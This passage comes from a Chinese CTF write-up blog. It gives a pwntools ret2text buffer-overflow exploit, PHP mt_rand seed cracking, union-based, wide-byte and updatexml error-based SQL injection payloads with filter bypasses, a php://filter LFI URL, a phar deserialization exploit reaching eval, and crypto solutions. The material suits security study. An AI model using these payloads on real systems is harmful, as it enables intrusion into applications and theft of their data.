edi,0x400964</span><br><span class="line">   0x00000000004007a7 &lt;+172&gt;:call   0x400580 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000004007ac &lt;+177&gt;:mov    edx,DWORD PTR [rbp-0x4]   &#x2F;&#x2F;传入第三个参数值给edx</span><br><span class="line">   0x00000000004007af &lt;+180&gt;:lea    rax,[rbp-0x10]</span><br><span class="line">   0x00000000004007b3 &lt;+184&gt;:mov    rsi,rax    &#x2F;&#x2F;传入第二个参数值给rsi</span><br><span class="line">   0x00000000004007b6 &lt;+187&gt;:mov    edi,0x0    &#x2F;&#x2F;传入第一个参数值给edi</span><br><span class="line">   0x00000000004007bb &lt;+192&gt;:mov    eax,0x0</span><br><span class="line">   0x00000000004007c0 &lt;+197&gt;:call   0x4005a0 &lt;read@plt&gt;</span><br><span class="line">   0x00000000004007c5 &lt;+202&gt;:mov    eax,0x0</span><br><span class="line">   0x00000000004007ca &lt;+207&gt;:leave  </span><br><span class="line">   0x00000000004007cb &lt;+208&gt;:ret</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">if args[&#39;REMOTE&#39;]:</span><br><span class="line">    sh &#x3D; remote(sys.argv[1], sys.argv[2])</span><br><span class="line">else:</span><br><span class="line">    sh &#x3D; process(&quot;.&#x2F;ret2text&quot;)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&quot;name:\n&quot;,str(50))</span><br><span class="line"></span><br><span class="line">payload&#x3D;&quot;a&quot;*0x18 + p64(0x0000000004006E6)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;name?\n&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">print(sh.recv())</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安恒杯丨新春祈福赛</title>
      <link href="/2020/03/20/%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%A8%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/"/>
      <url>/2020/03/20/%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%A8%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="0x-01-枯燥的抽奖"><a href="#0x-01-枯燥的抽奖" class="headerlink" title="0x 01 枯燥的抽奖"></a>0x 01 枯燥的抽奖</h3><ul><li><p>来源</p><p>GWCTF2019</p></li><li><p>解题过程</p></li></ul><ol><li>访问check.php得到源代码</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">#这不是抽奖程序的源代码！不许看！</span><br><span class="line">header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">session_start();</span><br><span class="line">if(!isset($_SESSION[&#39;seed&#39;]))&#123;</span><br><span class="line">$_SESSION[&#39;seed&#39;]&#x3D;rand(0,999999999);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[&#39;seed&#39;]);</span><br><span class="line">$str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">$str&#x3D;&#39;&#39;;</span><br><span class="line">$len1&#x3D;20;</span><br><span class="line">for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show &#x3D; substr($str, 0, 10);</span><br><span class="line">echo &quot;&lt;p id&#x3D;&#39;p1&#39;&gt;&quot;.$str_show.&quot;&lt;&#x2F;p&gt;&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#39;num&#39;]))&#123;</span><br><span class="line">    if($_POST[&#39;num&#39;]&#x3D;&#x3D;&#x3D;$str)&#123;x</span><br><span class="line">        echo &quot;&lt;p id&#x3D;flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &quot;&lt;p id&#x3D;flag&gt;没抽中哦，再试试吧&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(&quot;check.php&quot;);</span><br></pre></td></tr></table></figure><p>根据代码可知是使用mt_srand()生成20位随机数，并且知道随机数的前10位</p><ol start="2"><li>这时我们可以用到一款工具<strong>php_mt_seed*</strong>（PHP mt_rand（）种子破解程序）*</li></ol><p>具体解法是先用脚本将伪随机数转换成php_mt_seed可以识别的数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">str1&#x3D;&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><br><span class="line">str2&#x3D;&#39;RymjbZRSUv&#39;</span><br><span class="line">str3 &#x3D; str1[::-1]</span><br><span class="line">length &#x3D; len(str2)</span><br><span class="line">res&#x3D;&#39;&#39;</span><br><span class="line">for i in range(len(str2)):</span><br><span class="line">    for j in range(len(str1)):</span><br><span class="line">        if str2[i] &#x3D;&#x3D; str1[j]:</span><br><span class="line">            res+&#x3D;str(j)+&#39; &#39;+str(j)+&#39; &#39;+&#39;0&#39;+&#39; &#39;+str(len(str1)-1)+&#39; &#39;</span><br><span class="line">            break</span><br><span class="line">print res</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;output:</span><br><span class="line">53 53 0 61 24 24 0 61 12 12 0 61 9 9 0 61 1 1 0 61 61 61 0 61 53 53 0 61 54 54 0 61 56 56 0 61 21 21 0 61</span><br></pre></td></tr></table></figure><p>使用<a href="https://www.openwall.com/php_mt_seed/爆破出种子" target="_blank" rel="noopener">https://www.openwall.com/php_mt_seed/爆破出种子</a></p><p><img src="/2020/03/20/%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%A8%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/image-20200128105021483.png" alt></p><p>我们即可得到满足条件的seed:<br>    seed = 0x29c11047 = 700518471 (PHP 7.1.0+)<br> 爆破出伪随机数和php版本.</p><ol start="3"><li>然后改写源码，生成完整字符串</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(700518471);</span><br><span class="line"></span><br><span class="line">$str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">$str&#x3D;&#39;&#39;;</span><br><span class="line">$len1&#x3D;20;</span><br><span class="line">for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       </span><br><span class="line">&#125;</span><br><span class="line">echo $str;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="0x-02-BabySqli"><a href="#0x-02-BabySqli" class="headerlink" title="0x 02 BabySqli"></a>0x 02 BabySqli</h3><ul><li><p>来源</p><p>GXYCTF2019</p></li><li><p>解题过程</p></li></ul><ol><li>题目提示了用md5做哈希，fuzz可以知道admin是账号。题目过滤了小括号、or和=，没有过滤union，用union万能密码绕过即可</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># username:</span><br><span class="line">-1&#39; union select 1, &#39;admin&#39;, &#39;202cb962ac59075b964b07152d234b70&#39; #</span><br><span class="line"># password:</span><br><span class="line">123</span><br></pre></td></tr></table></figure><h3 id="0x-03-BabySqli-2"><a href="#0x-03-BabySqli-2" class="headerlink" title="0x 03 BabySqli 2"></a>0x 03 BabySqli 2</h3><ul><li><p>来源</p><p>GXYCTF2019</p></li><li><p>解题过程</p></li></ul><ol><li>题目提示了支持中文，就可以想到宽字节，登陆之后发现有一个显示位，可以通过联合查询得到flag</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">题目考点和过滤：</span><br><span class="line">宽字节注入，过滤0x，union select where置空</span><br><span class="line"></span><br><span class="line"># 显示database</span><br><span class="line">name&#x3D;1%df%27ununionion%20selselectect%201,char(97,100,109,105,110),database()%23&amp;pw&#x3D;1</span><br><span class="line"># 得到数据库名为web_sqli</span><br><span class="line"></span><br><span class="line"># 显示表名</span><br><span class="line">name&#x3D;1%df%27ununionion%20selselectect%201,char(97,100,109,105,110),group_concat(table_name)%20from%20information_schema.tables%20whwhereere%20table_schema&#x3D;database()%23&amp;pw&#x3D;1</span><br><span class="line"># 得到表名为f14g,user</span><br><span class="line"></span><br><span class="line"># 显示f14g列名</span><br><span class="line">name&#x3D;1%df%27ununionion%20selselectect%201,char(97,100,109,105,110),group_concat(column_name)%20from%20information_schema.columns%20whwhereere%20table_name%20&#x3D;%20char(102,49,52,103)%23&amp;pw&#x3D;1</span><br><span class="line"># 得到f14g列名为b80bb7740288fda1f201890375a60c8f,327a6c4304ad5938eaf0efb6cc3e53dc</span><br><span class="line"></span><br><span class="line"># 拿到flag</span><br><span class="line">name&#x3D;1%df%27ununionion%20selselectect%201,char(97,100,109,105,110),327a6c4304ad5938eaf0efb6cc3e53dc%20from%20f14g%20limit%2022,1%23&amp;pw&#x3D;1</span><br></pre></td></tr></table></figure><p>报错注入payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># 显示database</span><br><span class="line">name&#x3D;admin%df%27%20and%20updatexml(1,concat(1,database()),1)%20--+&amp;pw&#x3D;1</span><br><span class="line"></span><br><span class="line"># 显示表名</span><br><span class="line">name&#x3D;admin%df%27%20and%20updatexml(1,concat(1,(seSELECTlect%20group_concat(table_name)%20from%20information_schema.tables%20whWHEREere%20table_schema&#x3D;database()%20limit%200,1)),1)%20--+&amp;pw&#x3D;1</span><br><span class="line"># Error: XPATH syntax error: &#39;f14g,user&#39; </span><br><span class="line"></span><br><span class="line"># 显示f14g列名</span><br><span class="line">name&#x3D;admin%df%27%20and%20updatexml(1,concat(1,%20(seSELECTlect%20group_conca</span><br><span class="line">t(column_name)%20from%20information_schema.columns%20wherWHEREe%20TABLE_NAME</span><br><span class="line">&#x3D;char(102,49,52,103))),1)%20--+&amp;pw&#x3D;1</span><br><span class="line"># Error: XPATH syntax error: &#39;b80bb7740288fda1f201890375a60c8f&#39; </span><br><span class="line"></span><br><span class="line"># 查字段</span><br><span class="line">name&#x3D;admin%df%27%20and%20updatexml(1,concat(1,(seleSELECTct%20concat(327a6c4304ad5938eaf0efb6cc3e53dc)%20from%20f14g%20limit%200,1),1),1)%20--+%20&amp;pw&#x3D;y1ng</span><br><span class="line"># Error: XPATH syntax error: &#39;VGhlIGZpcnN0IG1hbiBuYW1lIHdhcyBr&#39; </span><br><span class="line"></span><br><span class="line"># 查flag</span><br><span class="line">name&#x3D;admin%df%27%20and%20updatexml(1,concat(1,(seleSELECTct%20concat(327a6c4304ad5938eaf0efb6cc3e53dc)%20from%20f14g%20limit%2022,1),1),1)%20--+%20&amp;pw&#x3D;1</span><br><span class="line"># Error: XPATH syntax error: &#39;R1hZe2cwT2Rfam9iMWltX3NvX3ZlZ2V0&#39; </span><br><span class="line"># 因为 updatexml 返回最大长度就是32，超过32位的被丢弃了，所以上面无论是歌词还是flag，base64都经常缺个尾</span><br><span class="line"># substr() 可以指定从字符串的某个位置开始，返回自定义长度：</span><br><span class="line">name&#x3D;admin%df%27 and updatexml(1,concat(1, substr((seleSELECTct concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 22,1),10,32)),1) --+ &amp;pw&#x3D;11</span><br><span class="line">得到后半部分，拼接得到flag</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://www.colabug.com/2019/1225/6768296/amp/" target="_blank" rel="noopener">https://www.colabug.com/2019/1225/6768296/amp/</a></p><h3 id="0x-04-Babysqliv3-0"><a href="#0x-04-Babysqliv3-0" class="headerlink" title="0x 04 Babysqliv3.0"></a>0x 04 Babysqliv3.0</h3><ul><li><p>来源</p><p>GXYCTF2019</p></li><li><p>解题过程</p></li></ul><ol><li>在登录页查看源码可以看到<code>&lt;!-- u9db8 --&gt;</code>，可以用Unicode解码得到鶸，说明这是一个弱口令，并不是注入题，用弱口令字典可以跑出来，账号口令是admin/password，即可成功登陆</li><li>登陆发现是一个文件上传，简单操作后发现只能上传txt文件；然后发现url里有引用，猜测可能存在LFI(Local File Include)，使用filter协议可以看网站源码。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;183.129.189.60:10009&#x2F;home.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;upload</span><br></pre></td></tr></table></figure><p>home.php源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt; </span><br><span class="line"></span><br><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">上传文件</span><br><span class="line">&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;上传&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class Uploader&#123;</span><br><span class="line">public $Filename;</span><br><span class="line">public $cmd;</span><br><span class="line">public $token;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function __construct()&#123;</span><br><span class="line">$sandbox &#x3D; getcwd().&quot;&#x2F;uploads&#x2F;&quot;.md5($_SESSION[&#39;user&#39;]).&quot;&#x2F;&quot;;</span><br><span class="line">$ext &#x3D; &quot;.txt&quot;;</span><br><span class="line">@mkdir($sandbox, 0777, true);</span><br><span class="line">if(isset($_GET[&#39;name&#39;]) and !preg_match(&quot;&#x2F;data:\&#x2F;\&#x2F; | filter:\&#x2F;\&#x2F; | php:\&#x2F;\&#x2F; | \.&#x2F;i&quot;, $_GET[&#39;name&#39;]))&#123;</span><br><span class="line">$this-&gt;Filename &#x3D; $_GET[&#39;name&#39;];</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">$this-&gt;Filename &#x3D; $sandbox.$_SESSION[&#39;user&#39;].$ext;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$this-&gt;cmd &#x3D; &quot;echo &#39;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#39;;&quot;;</span><br><span class="line">$this-&gt;token &#x3D; $_SESSION[&#39;user&#39;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function upload($file)&#123;</span><br><span class="line">global $sandbox;</span><br><span class="line">global $ext;</span><br><span class="line"></span><br><span class="line">if(preg_match(&quot;[^a-z0-9]&quot;, $this-&gt;Filename))&#123;</span><br><span class="line">$this-&gt;cmd &#x3D; &quot;die(&#39;illegal filename!&#39;);&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">if($file[&#39;size&#39;] &gt; 1024)&#123;</span><br><span class="line">$this-&gt;cmd &#x3D; &quot;die(&#39;you are too big (′▽&#96;〃)&#39;);&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">$this-&gt;cmd &#x3D; &quot;move_uploaded_file(&#39;&quot;.$file[&#39;tmp_name&#39;].&quot;&#39;, &#39;&quot; . $this-&gt;Filename . &quot;&#39;);&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function __toString()&#123;</span><br><span class="line">global $sandbox;</span><br><span class="line">global $ext;</span><br><span class="line">&#x2F;&#x2F; return $sandbox.$this-&gt;Filename.$ext;</span><br><span class="line">return $this-&gt;Filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function __destruct()&#123;</span><br><span class="line">if($this-&gt;token !&#x3D; $_SESSION[&#39;user&#39;])&#123;</span><br><span class="line">$this-&gt;cmd &#x3D; &quot;die(&#39;check token falied!&#39;);&quot;;</span><br><span class="line">&#125;</span><br><span class="line">eval($this-&gt;cmd);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_FILES[&#39;file&#39;])) &#123;</span><br><span class="line">$uploader &#x3D; new Uploader();</span><br><span class="line">$uploader-&gt;upload($_FILES[&quot;file&quot;]);</span><br><span class="line">if(@file_get_contents($uploader))&#123;</span><br><span class="line">echo &quot;下面是你上传的文件：&lt;br&gt;&quot;.$uploader.&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo file_get_contents($uploader);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>官方解法：</p><p>只要构造一个phar反序列化文件，将命令替换为getflag操作，再把检查的token替换为服务器分发的，最后控制文件名进行反序列化操作，达到任意命令执行的目的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 使用时请将上文中的对象代码粘贴到本代码之前</span><br><span class="line">&lt;?php</span><br><span class="line">@unlink(&quot;exp.phar&quot;);</span><br><span class="line">$phar &#x3D; new Phar(&quot;exp.phar&quot;); &#x2F;&#x2F;后缀名必须为phar</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置stub</span><br><span class="line">$o &#x3D; new Uploader();</span><br><span class="line">$o-&gt;token &#x3D; &quot;GXYb4b627c1236f2c1b9463e18e0e7bfe30&quot;;</span><br><span class="line">$o-&gt;cmd &#x3D; &quot;echo file_get_contents(&#39;.&#x2F;flag.php&#39;);&quot;;</span><br><span class="line">$o-&gt;Filename &#x3D;</span><br><span class="line">&quot;phar:&#x2F;&#x2F;uploads&#x2F;909c00f0b41f82ef8c579546b5ed765e&#x2F;GXYb4b627c1236f2c1b9463e18e</span><br><span class="line">0e7bfe30.txt&quot;;</span><br><span class="line">$phar-&gt;setMetadata($o); &#x2F;&#x2F;将自定义的meta-data存入manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;a&quot;, &quot;a&quot;); &#x2F;&#x2F;添加要压缩的文件</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/20/%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%A8%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/image-20200128134233300.png" alt></p><p>非预期解法：</p><p>控制URL中name参数直接上传php文件</p><p><img src="/2020/03/20/%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%A8%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/image-20200128135733422.png" alt></p><p><img src="/2020/03/20/%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%A8%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/image-20200128135811226.png" alt></p><p><img src="/2020/03/20/%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%A8%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%A8%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B%5Cimage-20200128135857775.png" alt></p><p>nepnep战队解法：</p><p>在upload.php页面上传，get提交参数name=flag.php</p><p><img src="/2020/03/20/%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%A8%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%A8%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B%5C11.png" alt></p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="0x-01-密码本（提交你找到的字符串的md5值）"><a href="#0x-01-密码本（提交你找到的字符串的md5值）" class="headerlink" title="0x 01 密码本（提交你找到的字符串的md5值）"></a>0x 01 密码本（提交你找到的字符串的md5值）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">这个密码本本该只使用一次的，但是却使用了多次，导致密文易被破解</span><br><span class="line">经过一番尝试发现，秘钥的首字母很可能是y，剩下的就靠你了</span><br><span class="line"></span><br><span class="line">cip1: rlojsfklecby</span><br><span class="line">cip2: ulakqfgfsjlu</span><br><span class="line">cip3: dpaxwxtjgtay</span><br></pre></td></tr></table></figure><p>参考解法：<a href="https://blog.csdn.net/qq_34072526/article/details/88074122" target="_blank" rel="noopener">https://blog.csdn.net/qq_34072526/article/details/88074122</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">key &#x3D; &#39;yearofthepig&#39;</span><br><span class="line">t1 &#x3D; &#39;rlojsfklecby&#39;</span><br><span class="line">t2 &#x3D; &#39;ulakqfgfsjlu&#39;</span><br><span class="line">t3 &#x3D; &#39;dpaxwxtjgtay&#39;</span><br><span class="line">res1 &#x3D; res2 &#x3D; res3 &#x3D; &#39;&#39;</span><br><span class="line">for i in range(len(key)):</span><br><span class="line">    res1 +&#x3D; chr((ord(t1[i]) - ord(key[i])) %26 + ord(&#39;a&#39;))</span><br><span class="line">    res2 +&#x3D; chr((ord(t2[i]) - ord(key[i])) %26 + ord(&#39;a&#39;))</span><br><span class="line">    res3 +&#x3D; chr((ord(t3[i]) - ord(key[i])) %26 + ord(&#39;a&#39;))</span><br><span class="line">print res1</span><br><span class="line">print res2</span><br><span class="line">print res3</span><br></pre></td></tr></table></figure><p>转换为md5即为flag</p><h3 id="0x-02-EasyProgram"><a href="#0x-02-EasyProgram" class="headerlink" title="0x 02 EasyProgram"></a>0x 02 EasyProgram</h3><p>这道题给出的是伪代码，从伪代码中可以看出，这是一个RC4加密，于是使用RC4解密即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import io</span><br><span class="line">f &#x3D; io.open(&#39;file.txt&#39;,&#39;r&#39;,encoding&#x3D;&#39;ISO-8859-1&#39;)</span><br><span class="line">c &#x3D; f.read()</span><br><span class="line">t &#x3D; []</span><br><span class="line">key &#x3D; &#39;whoami&#39;</span><br><span class="line">ch &#x3D; &#39;&#39;</span><br><span class="line">j &#x3D; 0 #初始化</span><br><span class="line">s &#x3D; list(range(256)) #创建有序列表</span><br><span class="line">for i in range(256):</span><br><span class="line">    j &#x3D; (j + s[i] + ord(key[i % len(key)])) % 256</span><br><span class="line">    s[i],s[j] &#x3D; s[j],s[i]</span><br><span class="line">i &#x3D; 0 #初始化</span><br><span class="line">j &#x3D; 0 #初始化</span><br><span class="line">for r in c:</span><br><span class="line">    i &#x3D; (i + 1)  % 256</span><br><span class="line">    j &#x3D; (j + s[i])  % 256</span><br><span class="line">    s[i], s[j] &#x3D; s[j], s[i]</span><br><span class="line">    x &#x3D; (s[i] + (s[j] % 256)) % 256</span><br><span class="line">    ch +&#x3D; chr(ord(r) ^ s[x])</span><br><span 